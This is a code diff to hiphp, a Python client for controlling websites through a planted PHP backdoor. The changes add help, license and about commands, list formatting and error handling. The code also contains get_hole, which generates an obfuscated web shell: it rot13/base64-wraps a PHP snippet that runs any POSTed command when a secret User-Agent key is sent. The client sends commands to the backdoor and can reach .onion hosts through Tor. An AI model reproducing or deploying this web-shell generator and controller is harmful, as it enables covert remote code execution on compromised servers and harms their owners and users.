@@ -16,6 +16,8 @@ from hiphp.hiphpcoding import rot13,tobase64,tomd5
 from hiphp.hiphpphpfunctions import *
 from hiphp.hiphphelp import help
 from hiphp.hiphpmsgs import *
+from hiphp.hiphplicense import license
+from hiphp.hiphpabout import about
 from ashar import *
 from hexor import *
 from asciitext import *
@@ -24,6 +26,7 @@ import re
 import ast
 #import readline
 from os.path import exists
+from biglibrary import *
 
 #start hiphp class:
 class hiphp:
@@ -57,17 +60,19 @@ class hiphp:
         logo=""
         if self.do_x==0:
             spas=" "*5
+            code_by=self.color.c("Code by -> ",self.c_yellow)+self.color.c("yasserbdj96",self.c_green)
             logo+=self.color.c(f"""
 {spas}             ▄███████▄    ▄█    █▄       ▄███████▄ 
 {spas}            ███    ███   ███    ███     ███    ███ 
 {spas}╦   ╦       ███    ███   ███    ███     ███    ███ 
 {spas}║   ║ ═╦═ ▀█████████▀  ▀▀███▀▀▀▀███▀  ▀█████████▀  
 {spas}╠═══╣  ║    ███          ███    ███     ███        
-{spas}║   ║  ║    ███          ███    ███     ███        
-{spas}╩   ╩ ═╩═  ▄████▀        ███    █▀     ▄████▀  V0.2.19\n""",self.c_red)
-            logo+=self.color.c(" "*37+"Code by -> ",self.c_yellow)+self.color.c("yasserbdj96\n",self.c_green)
-            logo+=self.color.c("\n - You are now connected safety. You can print the PHP commands below for comprehensive control of the site.\n",self.c_blue)
-            logo+=self.color.c(" - If you are having difficulties controlling the program, you can type '--help' for more informations.\n",self.c_yellow)
+{spas}║   ║  ║    ███  V0.2.20 ███    ███     ███ 
+{spas}╩   ╩ ═╩═  ▄████▀        ███    █▀     ▄████▀ {code_by}\n""",self.c_red)
+            logo+=self.color.c(" "*17+"https://github.com/yasserbdj96\n",self.c_blue)
+            #logo+=self.color.c(" "*37+"Code by -> ",self.c_yellow)+self.color.c("yasserbdj96\n",self.c_green)
+            #logo+=self.color.c("\n - You are now connected safety. You can print the PHP commands below for comprehensive control of the site.\n",self.c_blue)
+            logo+=self.color.c("\n - '--help' for more informations.\n",self.c_yellow)
             logo+=self.color.c(" - '--exit' OR 'Ctrl+C' for exit :)\n\n",self.c_yellow)
             self.do_x+=1
         #
@@ -98,6 +103,12 @@ class hiphp:
             #exit
             elif command[0:6]=="--exit":
                 exit()
+            #license
+            elif command[0:9]=="--license":
+                print(license())
+            #about
+            elif command[0:7]=="--about":
+                print(about())
             #ls
             elif command[0:4]=="--ls":
                 if len(command)==4:
@@ -111,18 +122,25 @@ class hiphp:
                     command=scandir(dirx)
                 sd=hiphp.do(self,self.key,self.url,self.headers,True,command)
                 x=ast.literal_eval(sd)
+
+                
                 for i in range(len(x)):
                     if x[i]!="." and x[i]!="..":
-                        print(x[i].replace("\/","/"))
+                        x[i]=x[i].replace("\/","/")
+                
+                biglibrary().lslist(x,separator=" | ")
             #set
             elif command[0:5]=="--set":
                 self.set+=command[6:]
             #delete set
             elif command[0:6]=="--dset":
                 self.set=""
+            #clear
+            elif command[0:5]=="--cls":
+                os.system('cls' if os.name == 'nt' else 'clear')
             #Get the hole Code
-            elif command[0:6]=="--geth":
-                hiphp.get_hole(self)
+            elif command[0:6]=="--geth" or command[0:15]=="HIPHP_HOLE_CODE":
+                hiphp.get_hole(self,get=True)
             #cat
             elif command[0:5]=="--cat":
                 dirx=command[6:]
@@ -134,7 +152,7 @@ class hiphp:
                 
                 if varss[len(varss)-1]=="":
                     del varss[len(varss)-1]
-                hiphp.run_file(self,varss[1],varss[2:])
+                print(hiphp.run_file(self,varss[1],varss[2:]))
             #up
             elif command[0:4]=="--up":
                 try:
@@ -154,35 +172,37 @@ class hiphp:
     def do(self,key,url,header,retu,command):
         regex = re.compile(r"^https?\:\/\/[\w\-\.]+\.onion")
         proxies = {'http': 'socks5h://127.0.0.1:9150','https': 'socks5h://127.0.0.1:9150'}
-        if regex.match(url):
-            #.onion
-            response=requests.post(url,headers=header,proxies=proxies)
-        else:
-            response=requests.post(url,headers=header)
-        #response=requests.post(url,headers=header)
-        #
-        if response.status_code==200:
-            key_len=len(key)+1
-            # if the key are true:
-            if response.text[0:key_len]=="#"+key:
-                ploads={'command':self.set+command}
-                if ".onion" in url:
-                    response=requests.post(url,headers=header,data=ploads,proxies=proxies)
-                else:
-                    response=requests.post(url,headers=header,data=ploads)
-                response_text=response.text[key_len:]
-                if retu==True:
-                    return response_text
-                else:
-                    if len(response_text)!=0:
-                        print(response_text)
+
+        try:
+            if regex.match(url):
+                #.onion
+                response=requests.post(url,headers=header,proxies=proxies)
             else:
-                if retu==True:
-                    return emsg_1
+                response=requests.post(url,headers=header)
+            #response=requests.post(url,headers=header)
+            #
+            if response.status_code==200:
+                key_len=len(key)+1
+                # if the key are true:
+                if response.text[0:key_len]=="#"+key:
+                    ploads={'command':self.set+command}
+                    if ".onion" in url:
+                        response=requests.post(url,headers=header,data=ploads,proxies=proxies)
+                    else:
+                        response=requests.post(url,headers=header,data=ploads)
+                    response_text=response.text[key_len:]
+                    if retu==True:
+                        return response_text
+                    else:
+                        if len(response_text)!=0:
+                            print(response_text)
                 else:
-                    hexor().c(emsg_1,self.c_red)
-                    exit()
-        else:
+                    if retu==True:
+                        return emsg_1
+                    else:
+                        hexor().c(emsg_1,self.c_red)
+                        exit()
+        except:
             hexor().c(emsg_3+" '"+url+"'.",self.c_red)
             exit()
 
@@ -190,6 +210,7 @@ class hiphp:
     def run_file(self,file_path,*opts):        
         if exists(file_path):
             open_file=open(file_path).read()
+
             if open_file[0:5]=="<?php":
                 open_file=open_file[6:]
             if open_file[len(open_file)-2:len(open_file)]=="?>":
@@ -232,17 +253,19 @@ class hiphp:
             self.color2.c(f"{emsg_5} '{path_to_upluad}'.",self.c_red)
 
     #get the hole:
-    def get_hole(self):
+    def get_hole(self,get=False):
         code="if($_SERVER['HTTP_USER_AGENT']=='"+self.key+"'){echo'#"+self.key+"';if(isset($_POST['command'])){eval($_POST['command']);}exit;}"
         code=rot13(tobase64(rot13(tobase64(rot13(code)))))
         code=f"eval(str_rot13(base64_decode(str_rot13(base64_decode(str_rot13('{code}'))))));"
         php_s="/*php code start*/"
         php_e="/*php code end*/"
-        if self.retu==True:
+
+        if self.retu==True and get==False:
             return php_s+"\n"+code+"\n"+php_e
         else:
-            self.color2.c(msg_1,self.c_yellow)
-            self.color2.c(php_s,self.c_red)
-            self.color2.c(code,self.c_green)
-            self.color2.c(php_e,self.c_red)
+            geth=self.color.c(msg_1+"\n",self.c_yellow)
+            geth+=self.color.c(php_s+"\n",self.c_red)
+            geth+=self.color.c(code+"\n",self.c_green)
+            geth+=self.color.c(php_e,self.c_red)
+            print(geth)
 #}END.
